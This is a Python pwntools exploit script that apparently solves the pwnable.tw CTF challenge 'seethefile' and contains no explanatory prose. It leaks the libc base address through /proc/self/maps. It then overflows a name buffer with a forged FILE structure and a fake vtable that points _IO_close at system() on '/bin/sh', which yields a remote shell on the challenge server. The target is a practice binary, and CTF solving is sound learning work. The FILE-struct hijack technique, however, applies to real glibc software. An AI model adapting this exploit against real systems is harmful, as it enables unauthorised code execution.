#pwnable.tw
#seethefile

from pwn import *

debug = False

def menu(choice):
	s.recvuntil('Your choice :')
	s.sendline(str(choice))
	if debug:
		pass
		#print('menu', choice)

def openfile(filename):
	menu(1)
	s.recvuntil('What do you want to see :')
	s.sendline(filename)
	if debug:
		print('openfile finished')

def readfile():
	menu(2)
	if debug:
		print('readfile finished')

def writefile():
	menu(3)
	menuline = '---------------MENU---------------'
	re = s.recvuntil(menuline)
	if debug:
		print('writefile finished')
	return re[:-len(menuline)]

def closefile():
	menu(4)
	if debug:
		print('closefile finished')

def etc(name, menu_choice=5):
	menu(menu_choice)
	s.recvuntil('Leave your name :')
	s.sendline(name)
	if debug:
		print('etc finished')

def exploit():
	atoi_plt = 0x080485D0
	strstr_got = 0x0804B00C

	# libc leak
	openfile('/proc/self/maps')
	readfile()
	li = []
	while True:
		readfile()
		re = writefile()
		li_new = re.split('\n')
		if len(li) != 0:
			li[-1] += li[0]
		li += li_new[1:]
		if 'libc' in re:
			break
	for i in li:
		if 'libc' in i:
			libc_base = int(i[:8], 16)
			break
	log.info('libc_base : '+hex(libc_base))
	if debug:
		system_addr = libc_base + 0x3a950
	else:
		system_addr = libc_base + 0x3a940

	name = 0x0804B260
	fake_io_addr = name + 0x20 + 4

	fake_struct = '/bin/sh\x00'			# fake_io struct
	fake_struct += '\x00' * (0x48 - len(fake_struct))
	fake_struct += p32(name)			# fake _io_struct, (pointer to null)
	fake_struct += '\x00' * (0x94 - len(fake_struct))
	fake_struct += p32(fake_io_addr + len(fake_struct) + 4)

	fake_vtable = p32(0) * 17
	fake_vtable += p32(system_addr)		# fake vtable, fake _io_close()

	payload = '\x00' * 0x20
	payload += p32(fake_io_addr)
	payload += fake_struct
	payload += fake_vtable

	etc(payload)

if __name__ == '__main__':

	if debug:
		s = process("./seethefile")
		pause()
	else:
	    s = remote('chall.pwnable.tw', 10200)

	exploit()
	s.interactive()
	s.close()
